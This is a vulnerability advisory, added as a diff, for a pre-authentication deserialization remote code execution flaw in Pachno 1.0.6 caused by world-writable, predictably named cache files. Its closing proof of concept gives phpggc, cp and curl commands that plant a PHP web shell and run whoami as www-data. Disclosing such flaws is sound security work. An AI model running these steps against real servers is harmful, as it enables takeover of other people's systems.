@@ -1,0 +1,48 @@
+
+Pachno 1.0.6 FileCache Deserialization Remote Code Execution
+
+
+Vendor: Daniel André Eikeland
+Product web page: https://github.com/pachno/pachno
+Affected version: 1.0.6
+
+Summary: Pachno is an open-source collaboration platform (formerly known as The Bug
+Genie) designed for team project management, issue tracking, and documentation. It
+offers a module-based, customizable environment for software development and team
+workflows, distributed under the Mozilla Public License.
+
+Desc: The application uses unserialize() function on the contents of cache files
+stored under {PACHNO_PATH}/cache/ during the framework bootstrap sequence, before
+any authentication, routing, or controller logic is executed. Cache files are created
+with world-writable permissions (chmod 0666) and use deterministic, predictable
+filenames derived from a small set of constants. An attacker who can write to the
+cache directory can inject a serialized PHP object payload that triggers arbitrary
+code execution on the next HTTP request.
+
+Tested on: GNU/Linux
+           Apache2
+           PHP/7.4
+           MySQL/5.7 (MariaDB)
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2026-5986
+Advisory URL: https://www.zeroscience.mk/#/advisories/ZSL-2026-5986
+
+
+06.04.2026
+
+--
+
+
+# ./phpggc SwiftMailer/FW1 /var/www/html/public/cmd.php '<?php system($_GET["c"]); ?>' -s > chaka.bin
+# sleep 1
+...
+...
+$ cp chaka.bin /var/www/html/cache/_configuration-2142a.cache
+$ sleep 17
+$ curl "https://127.0.0.1/cmd.php?c=whoami"
+www-data
